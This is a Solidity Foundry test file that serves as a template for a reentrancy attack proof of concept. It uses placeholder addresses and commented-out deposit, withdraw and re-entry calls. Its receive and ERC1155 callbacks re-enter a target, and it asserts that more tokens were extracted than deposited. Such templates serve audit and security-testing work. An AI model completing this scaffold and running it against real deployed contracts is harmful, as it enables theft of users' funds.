// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./BaseTest.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

/// @notice Reentrancy attack PoC template.
/// TODO: Replace target interface and callback trigger.
contract ReentrancyAttackTest is BaseTest {
    // TODO: Set protocol-specific addresses
    address constant TARGET = address(0); // TODO: vulnerable contract
    address constant TOKEN = address(0);  // TODO: token involved
    uint256 constant DEPOSIT_AMOUNT = 100e18;
    uint256 internal attackCount;
    uint256 constant MAX_REENTRIES = 3;

    function _labelContracts() internal override {
        vm.label(TARGET, "Target");
        vm.label(TOKEN, "Token");
    }

    function test_reentrancyAttack() public {
        _dealToken(TOKEN, address(this), DEPOSIT_AMOUNT);
        IERC20(TOKEN).approve(TARGET, type(uint256).max);
        uint256 balBefore = IERC20(TOKEN).balanceOf(address(this));

        // TODO: Initial deposit into the vulnerable contract
        // ITarget(TARGET).deposit(DEPOSIT_AMOUNT);

        // TODO: Trigger withdrawal that sends ETH/tokens back (triggers callback)
        // ITarget(TARGET).withdraw(DEPOSIT_AMOUNT);

        uint256 balAfter = IERC20(TOKEN).balanceOf(address(this));
        assertGt(balAfter, balBefore, "Should have extracted more than deposited");
    }

    /// @dev Callback triggered on ETH receive — re-enters the target
    receive() external payable {
        if (attackCount < MAX_REENTRIES) {
            attackCount++;
            // TODO: Re-enter the vulnerable function
            // ITarget(TARGET).withdraw(DEPOSIT_AMOUNT);
        }
    }

    /// @dev Callback for ERC777/ERC1155 token receive — re-enters the target
    function onERC1155Received(address, address, uint256, uint256, bytes calldata)
        external returns (bytes4)
    {
        if (attackCount < MAX_REENTRIES) {
            attackCount++;
            // TODO: Re-enter the vulnerable function
        }
        return this.onERC1155Received.selector;
    }
}
